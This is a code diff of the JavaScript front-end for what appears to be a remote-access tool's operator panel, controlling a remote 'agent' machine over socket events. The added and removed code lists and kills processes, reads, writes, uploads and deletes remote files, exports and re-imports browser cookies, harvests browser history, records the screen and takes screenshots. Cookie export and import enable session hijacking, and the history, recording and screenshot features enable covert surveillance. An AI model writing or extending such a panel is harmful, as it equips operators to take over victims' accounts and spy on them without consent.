-    row.innerHTML = `<div class="proc-name">${esc(p.name||"?")}</div><div class="proc-pid">${p.pid}</div><div class="proc-cpu">${(p.cpu||0).toFixed(1)}%</div><div class="proc-mem">${fmtBytes((p.mem||0)*1024)}</div><button class="proc-kill" data-pid="${p.pid}">Kill</button>`;
-    procList.appendChild(row);
+let _procs=[];
+function reqProcs(){if(agent)socket.emit("get_processes",{_target:agent})}
+$("proc-ref").addEventListener("click",reqProcs);
+$("proc-q").addEventListener("input",renderProcs);
+socket.on("processes_result",d=>{_procs=d.processes||[];$("proc-n").textContent=_procs.length+" processes";renderProcs()});
+function renderProcs(){
+  const q=$("proc-q").value.toLowerCase(),list=q?_procs.filter(p=>(p.name||"").toLowerCase().includes(q)||String(p.pid).includes(q)):_procs;
+  const el=$("proc-list");el.innerHTML="";
+  list.forEach(p=>{
+    const r=document.createElement("div");r.className="pr";
+    r.innerHTML=`<div class="pn">${esc(p.name||"?")}</div><div class="pp">${p.pid}</div><div class="pc">${(p.cpu||0).toFixed(1)}%</div><div class="pm">${fmtB((p.mem||0)*1024*1024)}</div><button class="pk" data-pid="${p.pid}">Kill</button>`;
+    el.appendChild(r);
   });
-  procList.querySelectorAll(".proc-kill").forEach(btn => {
-    btn.addEventListener("click", () => {
-      socket.emit("kill_process", { pid:parseInt(btn.dataset.pid), _target:currentAgent });
-      setTimeout(reqProcesses, 800);
-    });
-  });
+  el.querySelectorAll(".pk").forEach(b=>b.addEventListener("click",()=>{socket.emit("kill_process",{pid:parseInt(b.dataset.pid),_target:agent});setTimeout(reqProcs,800)}));
 }
 
 /* ── File Manager ────────────────────────────────────────── */
-const fmPath   = document.getElementById("fm-path");
-const fmList   = document.getElementById("fm-list");
-const fmEditor = document.getElementById("fm-editor");
-let _editingPath = "", _editingB64 = "";
-
-document.getElementById("fm-go").addEventListener("click", () => {
-  if (!currentAgent) return;
-  socket.emit("list_dir", { path:fmPath.value, _target:currentAgent });
-});
-fmPath.addEventListener("keydown", e => { if (e.key==="Enter") document.getElementById("fm-go").click(); });
-
-socket.on("dir_result", d => {
-  if (!d) return;
-  fmPath.value = d.path||"";
-  fmList.innerHTML = "";
-  fmEditor.classList.remove("show");
-  if (d.parent) {
-    const row = document.createElement("div");
-    row.className = "fm-row";
-    row.innerHTML = `<div class="fm-icon">⬆</div><div class="fm-name">..</div>`;
-    row.addEventListener("click", () => socket.emit("list_dir", { path:d.parent, _target:currentAgent }));
-    fmList.appendChild(row);
-  }
-  (d.items||[]).forEach(item => {
-    const row = document.createElement("div");
-    row.className = "fm-row";
-    row.innerHTML = `<div class="fm-icon">${item.type==="dir"?"📁":"📄"}</div><div class="fm-name">${esc(item.name)}</div><div class="fm-size">${item.type==="file"?fmtBytes(item.size||0):""}</div><button class="fm-del">🗑</button>`;
-    row.addEventListener("click", e => {
-      if (e.target.classList.contains("fm-del")) return;
-      if (item.type==="dir") socket.emit("list_dir",{path:item.path,_target:currentAgent});
-      else socket.emit("read_file",{path:item.path,_target:currentAgent});
-    });
-    row.querySelector(".fm-del").addEventListener("click", e => {
-      e.stopPropagation();
-      if (!confirm("Delete "+item.name+"?")) return;
-      socket.emit("delete_path",{path:item.path,_target:currentAgent});
-    });
-    fmList.appendChild(row);
+let _ePath="",_eB64="";
+$("fm-go").addEventListener("click",()=>{if(agent)socket.emit("list_dir",{path:$("fm-path").value,_target:agent})});
+$("fm-path").addEventListener("keydown",e=>{if(e.key==="Enter")$("fm-go").click()});
+socket.on("dir_result",d=>{
+  if(!d)return;$("fm-path").value=d.path||"";$("fm-list").innerHTML="";$("fm-edit").classList.remove("show");
+  if(d.parent){const r=document.createElement("div");r.className="fm-r";r.innerHTML=`<div class="ic">⬆</div><div class="nm">..</div>`;r.addEventListener("click",()=>socket.emit("list_dir",{path:d.parent,_target:agent}));$("fm-list").appendChild(r)}
+  (d.items||[]).forEach(item=>{
+    const r=document.createElement("div");r.className="fm-r";
+    r.innerHTML=`<div class="ic">${item.type==="dir"?"📁":"📄"}</div><div class="nm">${esc(item.name)}</div><div class="sz">${item.type==="file"?fmtB(item.size||0):""}</div><button class="del">🗑</button>`;
+    r.addEventListener("click",e=>{if(e.target.classList.contains("del"))return;if(item.type==="dir")socket.emit("list_dir",{path:item.path,_target:agent});else socket.emit("read_file",{path:item.path,_target:agent})});
+    r.querySelector(".del").addEventListener("click",e=>{e.stopPropagation();if(!confirm("Delete "+item.name+"?"))return;socket.emit("delete_path",{path:item.path,_target:agent})});
+    $("fm-list").appendChild(r);
   });
 });
-
-socket.on("file_data", d => {
-  if (d.error) { toast("Cannot read: "+d.error, "error"); return; }
-  _editingPath = d.path||"";
-  _editingB64  = d.data||"";
-  document.getElementById("fm-editor-path").textContent = _editingPath;
-  // Try to show as text; fall back to hex message for binary
-  try {
-    const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
-    document.getElementById("fm-textarea").value = new TextDecoder("utf-8",{fatal:true}).decode(bytes);
-  } catch {
-    document.getElementById("fm-textarea").value = "[binary file — use ⬇ Download to save it]";
-  }
-  fmEditor.classList.add("show");
+socket.on("file_data",d=>{
+  if(d.error){toast("Cannot read: "+d.error,"err");return}
+  _ePath=d.path||"";_eB64=d.data||"";$("fm-editpath").textContent=_ePath;
+  try{const bytes=Uint8Array.from(atob(_eB64),c=>c.charCodeAt(0));$("fm-ta").value=new TextDecoder("utf-8",{fatal:true}).decode(bytes)}catch{$("fm-ta").value="[binary file — use Download to save]"}
+  $("fm-edit").classList.add("show");
 });
-
-document.getElementById("fm-save").addEventListener("click", () => {
-  if (!_editingPath || !currentAgent) return;
-  const text = document.getElementById("fm-textarea").value;
-  const b64 = btoa(unescape(encodeURIComponent(text)));
-  socket.emit("write_file",{path:_editingPath,data:b64,_target:currentAgent});
-});
-
-document.getElementById("fm-download").addEventListener("click", () => {
-  if (!_editingB64 || !_editingPath) return;
-  const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
-  const blob = new Blob([bytes]);
-  const a = Object.assign(document.createElement("a"),{
-    href: URL.createObjectURL(blob),
-    download: _editingPath.split(/[\\/]/).pop()
-  });
-  a.click(); URL.revokeObjectURL(a.href);
-});
-
-// Upload a local file to the current remote directory
-document.getElementById("fm-upload-btn").addEventListener("click", () => {
-  document.getElementById("fm-upload-input").click();
-});
-document.getElementById("fm-upload-input").addEventListener("change", function() {
-  const file = this.files[0];
-  if (!file || !currentAgent) return;
-  const remotePath = (fmPath.value || "").replace(/[\\/]$/, "") + "\\" + file.name;
-  const fr = new FileReader();
-  fr.onload = e => {
-    const b64 = e.target.result.split(",")[1];
-    socket.emit("write_file",{path:remotePath,data:b64,_target:currentAgent});
-    toast("Uploading "+file.name+"…");
-  };
-  fr.readAsDataURL(file);
-  this.value = "";
-});
-
-socket.on("write_result", d => toast(d.ok?"Saved.":"Save failed: "+d.error, d.ok?"success":"error"));
-socket.on("delete_result", d => {
-  toast(d.ok?"Deleted.":"Delete failed.", d.ok?"success":"error");
-  if (d.ok) socket.emit("list_dir",{path:fmPath.value,_target:currentAgent});
-});
+$("fm-save").addEventListener("click",()=>{if(!_ePath||!agent)return;const b=btoa(unescape(encodeURIComponent($("fm-ta").value)));socket.emit("write_file",{path:_ePath,data:b,_target:agent})});
+$("fm-dl").addEventListener("click",()=>{if(!_eB64||!_ePath)return;const bytes=Uint8Array.from(atob(_eB64),c=>c.charCodeAt(0));const blob=new Blob([bytes]);const a=Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:_ePath.split(/[\\/]/).pop()});a.click();URL.revokeObjectURL(a.href)});
+$("fm-ul-btn").addEventListener("click",()=>$("fm-ul-in").click());
+$("fm-ul-in").addEventListener("change",function(){const f=this.files[0];if(!f||!agent)return;const rp=($("fm-path").value||"").replace(/[\\/]$/,"")+"\\"+f.name;const fr=new FileReader();fr.onload=e=>{socket.emit("write_file",{path:rp,data:e.target.result.split(",")[1],_target:agent});toast("Uploading "+f.name+"...")};fr.readAsDataURL(f);this.value=""});
+socket.on("write_result",d=>toast(d.ok?"Saved.":"Save failed: "+d.error,d.ok?"ok":"err"));
+socket.on("delete_result",d=>{toast(d.ok?"Deleted.":"Delete failed.",d.ok?"ok":"err");if(d.ok)socket.emit("list_dir",{path:$("fm-path").value,_target:agent})});
 
 /* ── Cookies ─────────────────────────────────────────────── */
-const cookieStatus = document.getElementById("cookie-status");
-document.getElementById("btn-export-cookies").addEventListener("click", () => {
-  if (!currentAgent) return;
-  cookieStatus.textContent = "Exporting cookies…";
-  socket.emit("export_cookies",{_target:currentAgent});
+$("btn-exp-ck").addEventListener("click",()=>{if(!agent)return;$("cookie-status").textContent="Exporting cookies...";socket.emit("export_cookies",{_target:agent})});
+socket.on("cookies_data",d=>{
+  if(d.error){$("cookie-status").textContent="Error: "+d.error;return}
+  _expCk=d.cookies||[];$("cookie-status").textContent=`Exported ${_expCk.length} cookies. Download started.`;
+  const blob=new Blob([JSON.stringify(_expCk,null,2)],{type:"application/json"});
+  const a=Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:(agent||"cookies")+".json"});a.click();URL.revokeObjectURL(a.href);
 });
-socket.on("cookies_data", d => {
-  if (d.error) { cookieStatus.textContent = "Error: "+d.error; return; }
-  _exportedCookies = d.cookies||[];
-  cookieStatus.textContent = `Exported ${_exportedCookies.length} cookies. Download started.`;
-  const blob = new Blob([JSON.stringify(_exportedCookies,null,2)],{type:"application/json"});
-  const a = Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:(currentAgent||"cookies")+".json"});
-  a.click(); URL.revokeObjectURL(a.href);
+$("btn-imp-ck").addEventListener("click",()=>{
+  if(!agent)return;
+  if(_expCk){socket.emit("import_cookies",{cookies:_expCk,_target:agent});return}
+  const inp=document.createElement("input");inp.type="file";inp.accept=".json";
+  inp.onchange=()=>{const fr=new FileReader();fr.onload=e=>{try{socket.emit("import_cookies",{cookies:JSON.parse(e.target.result),_target:agent})}catch{$("cookie-status").textContent="Invalid JSON."}};fr.readAsText(inp.files[0])};inp.click();
 });
-document.getElementById("btn-import-cookies").addEventListener("click", () => {
-  if (!currentAgent) return;
-  if (_exportedCookies) { socket.emit("import_cookies",{cookies:_exportedCookies,_target:currentAgent}); return; }
-  const inp = document.createElement("input");
-  inp.type="file"; inp.accept=".json";
-  inp.onchange = () => {
-    const fr = new FileReader();
-    fr.onload = e => {
-      try { const c=JSON.parse(e.target.result); socket.emit("import_cookies",{cookies:c,_target:currentAgent}); }
-      catch { cookieStatus.textContent="Invalid JSON."; }
-    };
-    fr.readAsText(inp.files[0]);
-  };
-  inp.click();
-});
-socket.on("import_result", d => { cookieStatus.textContent = d.ok?"Import done: "+(d.message||"OK"):"Import error: "+d.message; });
+socket.on("import_result",d=>{$("cookie-status").textContent=d.ok?"Import done: "+(d.message||"OK"):"Import error: "+d.message});
 
 /* ── Recording ───────────────────────────────────────────── */
-let _recording = false;
-const recIndicator = document.getElementById("rec-indicator");
-const recLabel     = document.getElementById("rec-label");
-const recBtn       = document.getElementById("rec-btn");
-recBtn.addEventListener("click", () => {
-  if (!currentAgent) return;
-  _recording = !_recording;
-  socket.emit("command",{action:_recording?"start_recording":"stop_recording",_target:currentAgent});
-  recIndicator.classList.toggle("recording",_recording);
-  recBtn.textContent = _recording?"Stop Recording":"Start Recording";
-  recBtn.classList.toggle("stop",_recording);
-  recLabel.textContent = _recording?"Recording…":"Not recording";
+let _rec=false;
+$("rec-tog").addEventListener("click",function(){
+  if(!agent)return;_rec=!_rec;socket.emit("command",{action:_rec?"start_recording":"stop_recording",_target:agent});
+  $("rec-orb").classList.toggle("on",_rec);this.textContent=_rec?"Stop Recording":"Start Recording";this.classList.toggle("on",_rec);
+  $("rec-lbl").textContent=_rec?"Recording...":"Not recording";
+});
+
+/* ── System Info ─────────────────────────────────────────── */
+$("si-fetch").addEventListener("click",()=>{if(!agent)return;$("si-grid").innerHTML='<div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px 0">Loading...</div>';socket.emit("get_sysinfo",{_target:agent})});
+socket.on("sysinfo_result",d=>{
+  if(d.error){$("si-grid").innerHTML=`<div style="color:var(--red);grid-column:1/-1;text-align:center;padding:40px 0">Error: ${esc(d.error)}</div>`;return}
+  const g=$("si-grid");g.innerHTML="";
+  function card(label,val,sub,bar){
+    let h=`<div class="si-card"><div class="label">${label}</div><div class="val">${esc(val)}</div>`;
+    if(sub)h+=`<div class="sub">${esc(sub)}</div>`;
+    if(bar!==undefined){const c=bar>80?"var(--red)":bar>60?"var(--yellow)":"var(--green)";h+=`<div class="si-bar"><div class="si-bar-fill" style="width:${bar}%;background:${c}"></div></div>`}
+    h+="</div>";g.insertAdjacentHTML("beforeend",h);
+  }
+  card("Hostname",d.hostname||"?",d.username?("User: "+d.username):"");
+  card("Operating System",d.os||"?",d.os_version||"");
+  card("CPU",d.processor||"?",(d.cpu_cores_physical||"?")+" cores / "+(d.cpu_cores_logical||"?")+" threads",d.cpu_percent);
+  card("RAM",(d.ram_used_gb||0)+" / "+(d.ram_total_gb||0)+" GB","",d.ram_percent);
+  card("Uptime",d.uptime||"?");
+  if(d.battery)card("Battery",d.battery.percent+"%",d.battery.plugged?"Plugged in":"On battery",d.battery.percent);
+  if(d.network&&d.network.length){const ips=d.network.map(n=>n.iface+": "+n.ip).join(", ");card("Network",d.network[0].ip,ips)}
+  if(d.disks&&d.disks.length){
+    let dh='<div class="si-card" style="grid-column:1/-1"><div class="label">Disks</div>';
+    d.disks.forEach(dk=>{
+      const c=dk.percent>90?"var(--red)":dk.percent>70?"var(--yellow)":"var(--green)";
+      dh+=`<div class="disk-row"><span>${esc(dk.mount)} (${esc(dk.fs)})</span><span>${dk.used_gb}/${dk.total_gb} GB (${dk.percent}%)</span></div><div class="si-bar"><div class="si-bar-fill" style="width:${dk.percent}%;background:${c}"></div></div>`;
+    });
+    dh+="</div>";g.insertAdjacentHTML("beforeend",dh);
+  }
+});
+
+/* ── Browser History ─────────────────────────────────────── */
+let _hist=[];
+$("hist-fetch").addEventListener("click",()=>{if(!agent)return;$("hist-list").innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">Loading...</div>';socket.emit("get_history",{_target:agent,limit:1000})});
+socket.on("history_result",d=>{
+  if(d.error){$("hist-list").innerHTML=`<div style="color:var(--red);text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  _hist=d.history||[];$("hist-n").textContent=_hist.length+" entries";renderHist();
+});
+$("hist-q").addEventListener("input",renderHist);
+function renderHist(){
+  const q=$("hist-q").value.toLowerCase(),list=q?_hist.filter(h=>(h.title||"").toLowerCase().includes(q)||(h.url||"").toLowerCase().includes(q)):_hist;
+  const el=$("hist-list");el.innerHTML="";
+  list.slice(0,500).forEach(h=>{
+    const r=document.createElement("div");r.className="hi";
+    r.innerHTML=`<div class="br">${esc(h.browser)}</div><div class="info"><div class="ttl">${esc(h.title||"(no title)")}</div><div class="url">${esc(h.url)}</div></div><div class="vc">${h.visits||""}</div><div class="dt">${fmtDate(h.last_visit_ts)}</div>`;
+    el.appendChild(r);
+  });
+  if(!list.length)el.innerHTML='<div style="color:var(--text3);text-align:center;padding:40px">No results</div>';
+}
+
+/* ── Screenshot ──────────────────────────────────────────── */
+$("ss-take").addEventListener("click",()=>{if(!agent)return;$("ss-status").textContent="Capturing...";$("ss-preview").style.display="none";socket.emit("take_screenshot",{_target:agent})});
+socket.on("screenshot_result",d=>{
+  if(d.error){$("ss-status").textContent="Error: "+d.error;return}
+  $("ss-status").textContent="Screenshot captured. Click the image to download.";
+  const img=$("ss-preview");img.src="data:image/png;base64,"+d.data;img.style.display="block";
+  img.onclick=()=>{const a=Object.assign(document.createElement("a"),{href:img.src,download:(agent||"screenshot")+"_"+Date.now()+".png"});a.click()};
 });
 </script>
 </body>
